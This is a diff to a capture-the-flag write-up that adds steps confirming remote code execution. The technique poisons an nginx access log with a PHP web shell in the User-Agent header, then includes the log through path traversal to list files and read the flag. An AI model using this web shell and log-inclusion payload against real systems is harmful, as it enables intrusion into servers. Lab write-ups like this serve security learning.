@@ -58,13 +58,19 @@ User Agent: <?php system ($_GET['cmd']); ?>
 
 ![Screenshot 2025-04-16 135741](https://github.com/user-attachments/assets/249a9d64-e80d-40e2-a949-d9c4f56049b3)
 
-Found uid, gid and groups that means we can get the flags by using shell as a user agent.
+Found uid, gid and groups that means we can confirm _Remote Code Execution (RCE)_ and can get the flag by using shell as a user agent.
+## Confirmed Remote Code Execution and Retrieving the Flag
 
+With code execution established, I used the same technique to list files and retrieve the flag.
+
+### This lists out the files/folders in the directory.
 ```bash
 php?log=../../../../../../../../../..//var/log/nginx/access.log&cmd=ls+/
 ```
 ![Screenshot 2025-04-16 135803](https://github.com/user-attachments/assets/7b75caeb-df7f-48db-a092-abb3404636cf)
 
+### This retrives the flag.
 ```bash
-php?log=../../../../../../../../../..//var/log/nginx/access.log&cmd=ls+/<file_name>
+php?log=../../../../../../../../../..//var/log/nginx/access.log&cmd=cat+/<file_name>
 ```
+Happy Hacking.
